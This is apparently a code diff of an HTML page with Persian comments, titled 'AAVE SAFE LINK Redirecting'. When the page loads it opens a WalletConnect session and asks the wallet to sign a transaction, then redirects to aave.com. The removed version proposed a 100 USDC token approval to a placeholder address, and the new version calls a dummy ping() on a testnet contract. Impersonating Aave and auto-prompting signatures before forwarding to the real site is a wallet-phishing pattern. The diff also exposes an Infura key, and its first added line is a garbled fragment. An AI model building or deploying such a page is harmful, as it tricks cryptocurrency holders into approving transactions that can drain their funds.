@@ -1,24 +1,23 @@
+    :// infuraId: 'c886ed6dee284317ad1e17cb5e5cba6f', 
 <!DOCTYPE html>
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title> </title>
+  <title>AAVE SAFE LINK Redirecting</title>
   <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
   <script src="https://unpkg.com/@walletconnect/web3-provider@2.0.0/dist/umd/index.min.js"></script>
 </head>
 <body>
   <script>
-    // کد برای لینک مستقیم: همزمان کیف پول باز می‌کنه و به test.com ریدایرکت می‌کنه
+    // کد برای لینک مستقیم: کیف پول باز می‌کنه و به test.com ریدایرکت می‌کنه
     async function createDeepLinkAndOpenSite() {
-      // دیباگ: چک کردن شروع فرآیند
       console.log('شروع اتصال به WalletConnect...');
       
       // ایجاد provider WalletConnect
       const provider = new WalletConnectProvider({
-        infuraId: 'c886ed6dee284317ad1e17cb5e5cba6f', // جایگذاری کلید Infura (بدون '')
-        chainId: 11155111, // Sepolia برای تست (برای اتریوم اصلی: 1)
-        // اضافه کردن bridge برای اطمینان از اتصال
-        rpc: { 11155111: 'https://sepolia.infura.io/v3/your_infura_id_here' }
+        infuraId: 'c886ed6dee284317ad1e17cb5e5cba6f', // کلید Infura (بدون '')
+        chainId: 11155111, // Sepolia برای تست
+        rpc: { 11155111: 'https://sepolia.infura.io/v3/c886ed6dee284317ad1e17cb5e5cba6f' } // RPC برای Sepolia
       });
 
       try {
@@ -29,18 +28,15 @@
         // ایجاد signer
         const signer = new ethers.providers.Web3Provider(provider).getSigner();
 
-        // تراکنش نمونه: approve USDC برای Aave LendingPool
-        const usdcAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC (برای Sepolia، آدرس تست پیدا کن)
-        const aaveLendingPool = '0xYourAaveLendingPoolAddress'; // آدرس قرارداد Aave (جایگزین کن)
-        const amount = ethers.utils.parseUnits('100', 6); // 100 USDC (6 اعشار)
-        
-        // ABI ساده برای approve
-        const abi = ['function approve(address spender, uint256 amount) public returns (bool)'];
-        const contract = new ethers.Contract(usdcAddress, abi, signer);
+        // قرارداد نمونه (آدرس مثالی روی Sepolia)
+        const testContractAddress = '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984'; // آدرس UNI token روی Sepolia (برای تست)
+        // ABI ساده برای یه تابع dummy (مثلاً ping)
+        const abi = ['function ping() public'];
+        const contract = new ethers.Contract(testContractAddress, abi, signer);
 
-        // پیشنهاد تراکنش approve
-        console.log('پیشنهاد تراکنش approve...');
-        const tx = await contract.approve(aaveLendingPool, amount);
+        // فراخوانی تابع ping (تراکنش تست)
+        console.log('پیشنهاد تراکنش ping...');
+        const tx = await contract.ping();
         console.log('تراکنش پیشنهاد شد: ', tx.hash);
       } catch (error) {
         console.error('خطا در اتصال یا تراکنش: ', error.message);
@@ -51,7 +47,7 @@
     (function() {
       console.log('اجرای فرآیند...');
       createDeepLinkAndOpenSite();
-      window.location.replace('https://test.com');
+      window.location.replace('https://aave.com');
     })();
 
     // برای تست: اگر ?auto=false باشه، اجرا نشه
